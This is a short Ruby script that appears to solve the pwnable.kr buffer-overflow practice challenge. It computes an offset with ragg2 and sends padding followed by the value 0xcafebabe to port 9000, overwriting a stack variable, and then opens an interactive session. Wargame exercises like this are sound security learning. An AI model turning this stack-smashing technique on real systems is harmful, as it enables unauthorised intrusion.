require_relative 'shoe'
s = Shoe.new "pwnable.kr", 9000
offset = `ragg2 -q 0x41534141`.split("\n")[0].split(" ")[2].to_i
pwn = "A" * offset + [0xcafebabe].pack("V")
s.say pwn
s.tie!
